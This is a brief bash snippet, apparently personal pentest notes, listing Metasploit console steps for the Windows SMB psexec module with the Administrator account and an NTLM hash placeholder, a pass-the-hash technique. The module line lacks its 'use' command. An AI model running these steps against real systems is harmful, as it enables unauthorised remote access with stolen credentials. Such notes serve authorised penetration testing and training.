```bash
msfconsole
exploit/windows/smb/psexec
set smbuser Administrator
set smbpass <ln:ntlm hash>
set target ... # set target (probably Native Upload)
```